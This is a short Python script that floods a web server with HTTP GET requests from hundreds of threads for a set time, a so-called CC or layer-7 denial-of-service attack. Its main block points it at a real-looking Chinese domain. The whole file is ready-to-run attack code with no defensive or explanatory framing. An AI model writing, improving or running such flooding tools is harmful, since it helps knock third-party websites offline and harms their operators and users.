#!/usr/bin/env python3
#coding: utf8

import random, time
from time import sleep
from requests import get
from threading import Thread, Lock, activeCount

def cc(url, thread=300, time=300, pool=100):
    global sent, stop

    stop = False
    
    def Deamon(long):
        global stop
        print("[CC] {}".format(long))
        sleep(int(long))
        stop = True

    Thread(target=Deamon, args=(time,)).start()
    
    sent = 0
    class Loop(Thread):
        def __init__(self, url, thread):
            Thread.__init__(self)
            self.url = url
            self.thread = thread

        def run(self):
            global sent
            get(self.url)
            sent = sent + 1
            print("[CC] Thread{thread}: Sent {num} packet to {target}.\n".format(
                 thread = self.thread,
                 num = str(sent),
                 target = self.url,
                 ),
                 end = ""
                 )

    class Main(Thread):
        def __init__(self, url, thread, pool):
            Thread.__init__(self)
            self.url = url
            self.thread = thread
            self.pool = pool
            
        def run(self):
            limit = self.pool
            total = 0
            global stop
            while True:
                if activeCount() < limit:
                    Loop(url=self.url, thread=self.thread).start()
                    total = total +1
                    if stop:
                        return

    for i in range(1, thread):
        Main(url=url, thread=i, pool=pool).start()

if __name__ == "__main__":
    cc("http://htsxj.cn", thread=300, time=3, pool=100)
